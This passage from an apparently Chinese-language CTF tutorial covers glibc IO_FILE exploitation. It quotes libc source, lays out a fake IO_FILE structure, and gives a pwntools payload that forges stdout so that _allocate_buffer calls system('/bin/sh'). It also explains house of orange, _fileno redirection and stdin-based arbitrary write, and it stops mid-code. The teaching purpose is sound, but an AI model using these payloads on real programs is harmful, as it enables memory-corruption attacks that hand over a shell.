</span></span><span class="line"><span class="cl">  <span class="n">pos</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="n">_IO_size_t</span><span class="p">)</span> <span class="p">(</span><span class="nf">_IO_blen</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">+</span> <span class="n">flush_only</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_USER_BUF</span><span class="p">)</span> <span class="cm">/* not allowed to enlarge */</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kt">char</span> <span class="o">*</span><span class="n">new_buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="kt">char</span> <span class="o">*</span><span class="n">old_buf</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="kt">size_t</span> <span class="n">old_blen</span> <span class="o">=</span> <span class="nf">_IO_blen</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">_IO_size_t</span> <span class="n">new_size</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">old_blen</span> <span class="o">+</span> <span class="mi">100</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">&lt;</span> <span class="n">old_blen</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">new_buf</span>
</span></span><span class="line"><span class="cl">        <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_allocate_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">new_size</span><span class="p">);</span> <span class="c1">// 调用了fp-&gt;_s._allocate_buffer函数指针
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span><span class="n">new_buf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="cm">/*      __ferror(fp) = 1; */</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">old_buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">memcpy</span> <span class="p">(</span><span class="n">new_buf</span><span class="p">,</span> <span class="n">old_buf</span><span class="p">,</span> <span class="n">old_blen</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_free_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">old_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="cm">/* Make sure _IO_setb won&#39;t try to delete _IO_buf_base. */</span>
</span></span><span class="line"><span class="cl">          <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="nf">memset</span> <span class="p">(</span><span class="n">new_buf</span> <span class="o">+</span> <span class="n">old_blen</span><span class="p">,</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="n">new_size</span> <span class="o">-</span> <span class="n">old_blen</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">      <span class="nf">_IO_setb</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">new_buf</span><span class="p">,</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="n">new_size</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">new_buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">flush_only</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>和之前利用<code>_IO_str_finish</code>的思路差不多，可以看到其中调用了<code>fp-&gt;_s._allocate_buffer</code>函数指针，其参数<code>rdi</code>为<code>new_size</code>，因此，我们将<code>_s._allocate_buffer</code>改为<code>system</code>的地址，<code>new_size</code>改为<code>/bin/sh</code>的地址，又<code>new_size = 2 * old_blen + 100</code>，也就是<code>new_size = 2 * _IO_blen (fp) + 100</code>，可以找到宏定义：<code>#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</code>，因此<code>new_size = 2 * ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) + 100</code>，故我们可以使<code>_IO_buf_base = 0</code>，<code>_IO_buf_end = (bin_sh_addr - 100) // 2</code>，当然还不能忘了需要绕过<code>_IO_flush_all_lokcp</code>函数中的输出缓冲区的检查<code>_mode&lt;=0</code>以及<code>_IO_write_ptr&gt;_IO_write_base</code>才能进入到<code>_IO_OVERFLOW</code>中，故令<code>_IO_write_ptr = 0xffffffffffffffff</code>且<code>_IO_write_base = 0x0</code>即可。
最终可按如下布局<code>fake IO_FILE</code>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="p">.</span><span class="n">_chain</span> <span class="o">=&gt;</span> <span class="n">chunk_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">chunk_addr</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">file</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">_flags</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_read_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_write_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="p">(</span><span class="n">bin_sh_addr</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="c1">// 2,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">...</span>
</span></span><span class="line"><span class="cl">      <span class="n">_mode</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> <span class="c1">//一般不用特意设置
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">_unused2</span> <span class="o">=</span> <span class="sc">&#39;\000&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">19</span> <span class="n">times</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="n">vtable</span> <span class="o">=</span> <span class="n">_IO_str_jumps</span> <span class="c1">//chunk_addr + 0xd8 ~ +0xe0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="mh">0xe0</span> <span class="o">~</span> <span class="o">+</span><span class="mh">0xe8</span> <span class="o">:</span> <span class="n">system_addr</span> <span class="o">/</span> <span class="n">one_gadget</span> <span class="c1">//fp-&gt;_s._allocate_buffer
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>参考<code>payload</code>（劫持的<code>stdout</code>）：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">new_size</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad2084</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_read_ptr</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_read_end</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_read_base</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_base</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span> <span class="c1"># _IO_write_ptr</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_end</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_buf_base</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">new_size</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># _IO_buf_end</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;_IO_2_1_stdin_&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">((</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3ed8c0</span><span class="p">)</span> <span class="c1">#lock</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3eb8c0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">get_IO_str_jumps_offset</span><span class="p">())</span> <span class="c1"># _IO_str_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>而在<code>libc-2.28</code>及以后，由于不再使用偏移找<code>_s._allocate_buffer</code>和<code>_s._free_buffer</code>，而是直接用<code>malloc</code>和<code>free</code>代替，所以<code>FSOP</code>也失效了。</p>
<h2 id="house-of-orange">house of orange
</h2><p>利用<code>unsorted bin attack</code> 配合 <code>IO_FILE attack (FSOP)</code>进行攻击。
通过<code>unsorted bin attack</code>将<code>_IO_list_all</code>内容从<code>_IO_2_1_stderr_</code>改为<code>main_arena+88/96</code>（实则指向<code>top chunk</code>）。
而在<code>_IO_FILE_plus</code>结构体中，<code>_chain</code>的偏移为<code>0x68</code>，而<code>top chunk</code>之后为<code>0x8</code>单位的<code>last_remainder</code>，接下来为<code>unsorted bin</code>的<code>fd</code>与<code>bk</code>指针，共<code>0x10</code>大小，再之后为<code>small bin</code>中的指针（每个<code>small bin</code>有<code>fd</code>与<code>bk</code>指针，共<code>0x10</code>个单位），剩下<code>0x50</code>的单位，从<code>smallbin[0]</code>正好分配到<code>smallbin[4]</code>（准确说为其<code>fd</code>字段），大小就是从<code>0x20</code>到<code>0x60</code>，而<code>smallbin[4]</code>的<code>fd</code>字段中的内容为该链表中最靠近表头的<code>small bin</code>的地址 (<code>chunk header</code>)，因此<code>0x60</code>的<code>small bin</code>的地址即为<code>fake struct</code>的<code>_chain</code>中的内容，只需要控制该<code>0x60</code>的<code>small bin</code>（以及其下面某些堆块）中的部分内容，即可进行<code>FSOP</code>。</p>
<h2 id="io_file-attack-之-利用_fileno字段">IO_FILE attack 之 利用_fileno字段
</h2><p><code>_fileno</code>的值就是<strong>文件描述符</strong>，位于<code>stdin</code>文件结构开头<code>0x70</code>偏移处，如：<code>stdin</code>的<code>fileno</code>为<code>0</code>，<code>stdout</code>的<code>fileno</code>为<code>1</code>，<code>stderr</code>的<code>fileno</code>为<code>2</code>。
在漏洞利用中，可以通过修改<code>stdin</code>的<code>_fileno</code>值来<strong>重定位</strong>需要读取的文件，本来为<code>0</code>的话，表示从标准输入中读取，修改为<code>3</code>则表示为从文件描述符为<code>3</code>的文件（已经<code>open</code>的文件）中读取，该利用在某些情况下可直接读取<code>flag</code>。</p>
<h2 id="io_file-attack-之-任意读写">IO_FILE attack 之 任意读写
</h2><p>1.利用<code>stdin</code>进行<strong>任意写</strong></p>
<p><code>scanf</code>，<code>fread</code>，<code>gets</code>等读入走<code>IO</code>指针（<code>read</code>不走）。
<strong>大体流程</strong>为：若<code>_IO_buf_base</code>为空，则调用<code>_IO_doallocbuf</code>去初始化输入缓冲区，然后判断输入缓冲区是否存在剩余数据，如果输入缓冲区有剩余数据（<code>_IO_read_end &gt; _IO_read_ptr</code>）则将其<strong>直接拷贝至目标地址</strong>（不会对此时输入的数据进行读入），如果没有或不够，则调用<code>__underflow</code>函数<strong>执行系统调用读取数据</strong>（<code>SYS_read</code>）到输入缓冲区（从<code>_IO_buf_base</code>到<code>_IO_buf_end</code>，默认<code>0x400</code>，即将数据读到<code>_IO_buf_base</code>，读取<code>0x400</code>个字节），此时若实际读入了<code>n</code>个字节的数据，则<code>_IO_read_end = _IO_buf_base + n</code>（即<code>_IO_read_end</code>指向实际读入的最后一个字节的数据），之后再将输入缓冲区中的数据拷贝到目标地址。
这里需要注意的是，若输入缓冲区中没有剩余的数据，则每次读入数据进输入缓冲区，仅和<code>_IO_buf_base</code>与<code>_IO_buf_end</code>有关。
在将数据从输入缓冲区拷贝到目标地址的过程中，<strong>需要满足所调用的读入函数的自身的限制条件</strong>，例如：使用<code>scanf(&quot;%d&quot;,&amp;a)</code>读入整数，则当在输入缓冲区中遇到了字符（或<code>scanf</code>的一些截断符）等不符合的情况，就会停止这个拷贝的过程。最终，<code>_IO_read_ptr</code>指向成功拷贝到目的地址中的最后一个字节数据在输入缓冲区中的地址。因此，若是遇到了不符合限制条件的情况而终止拷贝，则最终会使得<code>_IO_read_end &gt; _IO_read_ptr</code>，即再下一次读入之前会被认定为输入缓冲区中仍有剩余数据，在此情况下，<strong>很有可能不会进行此次读入</strong>，或将输入缓冲区中剩余的数据拷贝到此次读入的目标地址，从而<strong>导致读入的错误</strong>。
<code>getchar()</code>和<code>IO_getc()</code>的作用是刷新<code>_IO_read_ptr</code>，每次调用，会从输入缓冲区读一个字节数据，即将<code>_IO_read_ptr++</code>。</p>
<p>相关源码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">_IO_size_t</span> <span class="nf">_IO_file_xsgetn</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">_IO_size_t</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="p">...</span>
</span></span><span class="line"><span class="cl">      <span class="c1">//输入缓冲区为空则初始化输入缓冲区
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="n">want</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">have</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">have</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="p">...</span>
</span></span><span class="line"><span class="cl">          <span class="c1">//memcpy
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span>
</span></span><span class="line"><span class="cl">          <span class="o">&amp;&amp;</span> <span class="n">want</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="nf">__underflow</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>  <span class="c1">// 调用__underflow读入数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="p">...</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">n</span> <span class="o">-</span> <span class="n">want</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">_IO_new_file_underflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_IO_ssize_t</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 会检查_flags是否包含_IO_NO_READS标志，包含则直接返回。
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// 标志的定义是#define _IO_NO_READS 4，因此_flags不能包含4。
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_READS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 如果输入缓冲区里存在数据，则直接返回
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
